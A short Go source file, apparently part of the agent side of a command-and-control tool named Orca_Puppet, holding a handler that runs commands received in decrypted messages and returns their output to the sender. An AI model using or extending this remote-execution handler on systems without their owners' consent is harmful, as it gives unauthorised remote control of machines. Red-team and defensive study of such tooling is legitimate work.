package controller

import (
	"Orca_Puppet/cli/cmdopt/shellopt"
	"Orca_Puppet/define/api"
	"Orca_Puppet/define/debug"
	"encoding/json"
	"fmt"
	"strings"
)

func powershellCmd(sendUserId, decData, msgId string) {
	var cmdInfo shellopt.CmdInfo
	err := json.Unmarshal([]byte(decData), &cmdInfo)
	if err != nil {
		return
	}
	cmdCtx := cmdInfo.Context
	host := api.HOST
	cmdCtx = strings.Replace(cmdCtx, `$host$`, host, -1)
	debug.DebugPrint(fmt.Sprintf(`receive cmd: %s`, cmdCtx))
	resBuffer := shellopt.ExecCmd(cmdCtx)
	shellopt.RetExecOutput(resBuffer, sendUserId, msgId)
}
